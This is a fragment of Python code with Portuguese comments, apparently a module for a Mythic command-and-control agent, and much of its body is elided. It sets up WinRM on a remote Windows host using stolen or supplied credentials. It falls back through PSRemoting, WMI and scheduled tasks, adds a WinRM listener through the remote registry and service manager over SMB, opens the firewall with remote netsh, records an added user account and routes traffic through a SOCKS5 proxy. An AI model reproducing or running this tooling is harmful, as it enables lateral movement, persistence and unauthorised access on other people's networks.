def winrm_ext(self, task_id, target="", port=5985, username="", password="",
    ...
    # Todos os imports vivem dentro do método (arquivo é spliced na classe do agente).
...
def _winrm_ext_remote(self, task_id, host, port=5985, username="", password="",
    ...
    if os.name != "nt":
        return "[!] winrm_ext (remote): Windows only."
    ...
    # ---------- execução remota genérica (prefere PSRemoting, depois WMI, depois schtasks) ----------
    ...
    if not ps_ok and w445:
        ...
        try:
            ...
            guid = "{" + str(uuid.uuid4()).upper() + "}"
            listener = reg_base + "\\Listener\\" + guid
            steps += [
            ...
            if ok:
                ...
                if rc == 0:
                    log("[+] SMB (reg+SCM): listener %s e serviço WinRM ativos no remoto" % guid)
                    if ssl:
                        log("[!] ssl no modo SMB: certificado precisa existir no remoto "
                            "(recomendo HTTP via tunnel)")
                    # firewall via netsh remoto (RPC 135)
    ...
    # ================== 5) ESTADO + SAÍDA ==================
    save = {"host": host, "port": port, "listeners": [], "user": add_user}
    if action == "cleanup":
        return "[+] Cleanup remoto: use a opção com o state salvo (ver abaixo)"
    try:
    ...
    log("[+] SOCKS5 do Mythic:  socks start %d" % socks_port)
    log("")
    log("=" * 70)
